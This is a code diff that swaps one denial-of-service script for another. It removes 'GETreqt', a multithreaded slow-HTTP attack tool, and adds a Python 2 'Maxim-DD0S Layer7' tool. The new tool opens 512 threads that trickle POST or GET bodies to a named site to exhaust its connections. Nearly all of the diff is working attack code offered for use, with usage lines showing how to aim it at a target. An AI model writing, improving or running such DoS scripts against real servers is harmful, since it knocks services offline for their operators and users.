@@ -1,151 +1,157 @@
+#!/usr/bin/python
+# _*_ coding: utf-8 _*_
 import os
-import socket 
+import sys
+import socket
 import time
-import threading 
-import random
-import string
-import argparse
-import requests
-import termcolor 
+import getopt
 import re
 import tqdm
+import string
+from threading import Thread
 
-# CLEAR
-os.system
+os.system("clear")
 
-
-def versionCheck():
-    global currentVersionNumber
-
-    print("\nChecking for GETreqt updates...", end="")
-
-    crawlVersionFile = requests.get(VERSION_CHECK_URL)
-    crawlVersionFile = str(crawlVersionFile.content)
-    crawlVersionFile = re.findall(r"([0-9]+)", crawlVersionFile)
-    latestVersionNumber = int(''.join(crawlVersionFile))
-
-    currentVersionNumber = re.findall(r"([0-9]+)", currentVersionNumber)
-    currentVersionNumber = int(''.join(currentVersionNumber))
-
-    if currentVersionNumber >= latestVersionNumber:
-        print(colored(" You are using the latest version!\n", "green"))
-    elif currentVersionNumber < latestVersionNumber:
-        print(colored(" You are using an older version of GETreqt.", "red"))
-        print(colored("\nGet the latest version at https://github.com/......-Multithreaded-Slow-DoS-Attack", "yellow"))
-        print(colored("Every new version comes with fixes, improvements, new features, etc..", "yellow"))
-        print(colored("Please do not open an Issue if you see this message and have not yet tried the latest version.\n", "yellow"))
-
-
-randomUserAgent = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Edg/87.0.664.57",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0",
-]
-successfulSends = 0
-
-
-def constructRequest():
-    requestHeaders = ["GET / HTTP/2.0",
-                      f"Host: {target}",
-                      # "Connection: keep-alive", # Not required with HTTP v1.1 & HTTP 2
-                      f"User-Agent: {random.choice(randomUserAgent)}\r\n",
-                      ]
-    if arguments.wait:
-        pass
-    elif arguments.end:
-        requestHeaders = requestHeaders[:3] + [f"User-Agent: {random.choice(randomUserAgent)}\r\n\r\n"]
-    GETrequest = "\r\n".join(requestHeaders).encode("utf-8")
-    return(GETrequest)
+# Color
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    ZA1 = '\033[31m'
+    ZA2 = '\033[32m'
+    ZA3 = '\033[33m'
+    FAIL = '\033[91m'
+    RESET = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+    ZH = '\033[97m'
+os.system("clear")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
 
 
-def deployRequests(target, port, length, currentSocket, GETrequest):
 
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    # sock.settimeout(5)
+class MyThread(Thread,):
+    def __init__(self,SITE, DOS_TYPE):
+        Thread.__init__(self)
+        self.method = DOS_TYPE
+        self.site = SITE
+        self.kill_received = False
+    def run(self):
+        while not self.kill_received:
+            server = socket.gethostbyname(self.site)
+            post = 'x' * 9999
+            file = '/'
+
+            request = '%s /%s HTTP/1.1\r\n' %(self.method.upper(),file)
+            request += 'Host: %s\r\n' % (self.site)
+            request += 'User-Agent: Mozilla/5.0 (Windows; U;Windows NT 6.1; en-US; rv:1.9.2.12) Gecko/20101026Firefox/3.6.12\r\n'
+            request += 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
+            request += 'Accept-Language: en-us,en;q=0.5\r\n'
+            request += 'Accept-Encoding: gzip,deflate\r\n'
+            request += 'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n'
+            request += 'Keep-Alive: 9000\r\n'
+            request += 'Connection: close\r\n'
+            request += 'Content-Type: application/x-www-form-urlencoded\r\n'
+            request += 'Content-length: %s\r\n\r\n' % (len(post))
+
+            newrequest = '%s\r\n' % (post)
+            newrequest += '\r\n'
+
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+            try:
+                s.connect((server, 80))
+                s.send(request)
+
+                for c in newrequest:
+                    sys.stdout.write( s.send(c).__str__() )
+                    time.sleep(60)
+                s.close()
+                #s.recv(50000)
+            except:
+                print "Target Down?"
+
+def da_delegator(SITE,DOS_TYPE):
+    thread_count = 512
+    print '=' * 60
+    print 'Maxim-DD0S #Layer7 Tool v.1'.center(60,'-')
+    print '=' * 60
+    threads = []
+    for num in range(thread_count):
+        thr1=MyThread(SITE,DOS_TYPE)
+        print 'start - %s' % thr1
+        thr1.start()
+        threads.append(thr1)
+        #thr1.join()
+
+    while len(threads) > 0:
+            try:
+                # Join all threads using a timeout so it doesn't block
+                # Filter out threads which have been joined or are None
+                threads = [t.join(1) for t in threads if t is not
+None and t.isAlive()]
+            except KeyboardInterrupt:
+                print "Ctrl-c received! Sending kill to threads... Just close The Terminal"
+                for t in threads:
+                    t.kill_received = True
+                    sys.exit(2)
+
+def main(argv):
+    def usage():
+        print '=' * 60
+        print 'Maxim-DD0S #Layer7 DDOS Tool v.1'.center(60,'-')
+        print '=' * 60
+        print 'For GET DOS - USAGE: Layer7.py -t get http://example.com'
+        print 'For POST DOS - USAGE: Layer7.py -t post http://example.com'
+        sys.exit(2)
+    if not argv:
+        usage()
     try:
-        sock.connect((target, port))
-        sock.send(GETrequest)
-    except:
-        try:
-            sock.shutdown(socket.SHUT_RDWR)
-            sock.close()
-            deployRequests(target, port, length, currentSocket, GETrequest)
-        except:
-            deployRequests(target, port, length, currentSocket, GETrequest)
+        opts, args = getopt.getopt(sys.argv[1:], "t:h", ["help",
+"type"])
+    except getopt.GetoptError, err:
+        print str(err)
+        sys.exit(2)
+    output = None
+    verbose = False
+    SITE = re.sub(r'http://', '', str(sys.argv[-1:][0]))
 
-    if arguments.end:
-        global successfulSends
-        for i in range(1, length + 1):
-            try:
-                sock.send(GETrequest)
-                successfulSends += 1
-                print(f"Successful send #{successfulSends} from socket {currentSocket}\n", end="")
-            except:
-                try:
-                    sock.shutdown(socket.SHUT_RDWR)
-                    sock.close()
-                    deployRequests(target, port, length, currentSocket, GETrequest)
-                except:
-                    deployRequests(target, port, length, currentSocket, GETrequest)
-            randomDelay = random.random() * 5
-            time.sleep(randomDelay)
+    for o, a in opts:
+        if o == "-v":
+            verbose = True
+        elif o in ("-t", "--type"):
+            if a.lower() == 'post':
+                DOS_TYPE = 'POST'
+                da_delegator(SITE,DOS_TYPE)
+            elif a.lower() =='get':
+                DOS_TYPE = 'get'
+                da_delegator(SITE,DOS_TYPE)
+        elif o in ("-h", "--help"):
+            usage()
+            sys.exit()
+        else:
+            assert False, "unhandled option"
 
-    else:
-        for i in range(1, length + 1):
-            try:
-                # sock.send(bytes(str(f"{random.randint(1, 5000)}\r\n"), encoding="utf-8"))
-                sock.send(b" ")
-                print(f"Sent \"don't you die on me\" packet {i} / {length} via socket {currentSocket}\n", end="")
-            except:
-                try:
-                    sock.shutdown(socket.SHUT_RDWR)
-                    sock.close()
-                    deployRequests(target, port, length, currentSocket, GETrequest)
-                except:
-                    deployRequests(target, port, length, currentSocket, GETrequest)
-            randomDelay = random.random() * 5
-            time.sleep(randomDelay)
-
-
-def attackThreads(target, port, length, sockets, GETrequest):
-    threadingPool = []
-    print()
-    for currentSocket in range(sockets):
-        threadingPool.append(threading.Thread(target=deployRequests, args=[target, port, length, currentSocket, GETrequest]))
-        print(f"Creating {currentSocket} sockets to attack {target} via port {port}\n", end="")
-        threadingPool[currentSocket].start()
-    for thread in threadingPool:
-        thread.join()
-    print("\nAttack completed. Press [Enter] to exit.")
-    input()
-
-
-if __name__ == "__main__":
-
-    printBanner()
-
-    versionCheck()
-
-    cli = argparse.ArgumentParser()
-    cliExclusive = cli.add_mutually_exclusive_group()
-
-    cli.add_argument("-x", "--target", required=True, help="Target web server address (IP addess or URL)")
-    cli.add_argument("-p", "--port", required=True, type=int, help="Target web server port (eg: 80)")
-    cli.add_argument("-l", "--length", required=True, type=int, help="Total packet length (eg: 1000)")
-    cli.add_argument("-t", "--threads", required=True, type=int, help="Threads (sockets) to attack with (eg: 6000)")
-    cliExclusive.add_argument("-w", "--wait", help="Do not terminate requests (elegant slow DoS)", action="store_true")
-    cliExclusive.add_argument("-e", "--end", help="Terminate all requests correctly (blatant GET spam)", action="store_true")
-
-    arguments = cli.parse_args()
-
-    target = arguments.target
-    port = arguments.port
-    length = arguments.length
-    sockets = arguments.threads
-
-    GETrequest = constructRequest()
-
-    attackThreads(target, port, length, sockets, GETrequest)
+if __name__=="__main__":
+    main(sys.argv[1:])
